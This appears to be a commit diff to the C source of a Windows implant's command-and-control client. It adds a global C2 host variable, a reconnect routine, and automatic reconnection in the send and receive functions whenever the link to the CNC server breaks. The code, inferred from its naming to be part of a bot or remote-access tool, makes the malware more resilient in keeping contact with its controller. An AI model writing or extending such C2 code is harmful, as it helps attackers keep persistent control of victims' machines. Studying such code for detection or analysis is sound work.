@@ -10,6 +10,7 @@
 #define SLEEP_INTERVAL_ON_CONNREFUSED_MS 30 * 1000
 
 SOCKET cnc_sock = INVALID_SOCKET;
+char *cnc_host;
 
 void init_winsock()
 {
@@ -25,14 +26,14 @@ void init_winsock()
     log_debug("Initialized Winsock.");
 }
 
-void get_cnc_addrinfo(char *host, struct addrinfo **result)
+void get_cnc_addrinfo(struct addrinfo **result)
 {
     int ret;
     char cnc_addr[255];
     long unsigned int cnc_addr_len = sizeof(cnc_addr);
     struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};
 
-    ret = getaddrinfo(host, CNC_PORT, &hints, result);
+    ret = getaddrinfo(cnc_host, CNC_PORT, &hints, result);
     if (ret)
     {
         log_error("getaddrinfo failed: %d", ret);
@@ -89,38 +90,66 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
     }
 }
 
+void reconnect_to_cnc()
+{
+    struct addrinfo *cnc_addrinfo;
+
+    get_cnc_addrinfo(&cnc_addrinfo);
+    init_cnc_sock();
+    connect_to_cnc(cnc_addrinfo);
+}
+
 int send_to_cnc(void *buf, size_t len)
 {
     int ret;
 
-    ret = send(cnc_sock, buf, len, 0);
-    if (ret == SOCKET_ERROR)
+    while (TRUE)
     {
-        log_error("Error at send(): %ld", WSAGetLastError());
-        exit(EXIT_FAILURE);
+        ret = send(cnc_sock, buf, len, 0);
+        if (ret == SOCKET_ERROR)
+        {
+            log_error("Error at send(): %ld", WSAGetLastError());
+            exit(EXIT_FAILURE);
+        }
+        if (!ret)
+        {
+            log_error("Connection with CNC broke.");
+            reconnect_to_cnc();
+            return 0;
+        }
+        return ret;
     }
-    return ret;
 }
 
 int recv_from_cnc(void *buf, size_t len)
 {
     int ret;
 
-    ret = recv(cnc_sock, buf, len, 0);
-    if (ret == SOCKET_ERROR)
+    while (TRUE)
     {
-        log_error("Error at recv(): %ld", WSAGetLastError());
-        exit(EXIT_FAILURE);
+        ret = recv(cnc_sock, buf, len, 0);
+        if (ret == SOCKET_ERROR)
+        {
+            log_error("Error at recv(): %ld", WSAGetLastError());
+            exit(EXIT_FAILURE);
+        }
+        if (!ret)
+        {
+            log_error("Connection with CNC broke.");
+            reconnect_to_cnc();
+            return 0;
+        }
+        return ret;
     }
-    return ret;
 }
 
-int init_cnc_conn(char *host)
+void init_cnc_conn(char *host)
 {
     struct addrinfo *cnc_addrinfo;
 
+    cnc_host = host;
     init_winsock();
-    get_cnc_addrinfo(host, &cnc_addrinfo);
+    get_cnc_addrinfo(&cnc_addrinfo);
     init_cnc_sock();
     connect_to_cnc(cnc_addrinfo);
 }
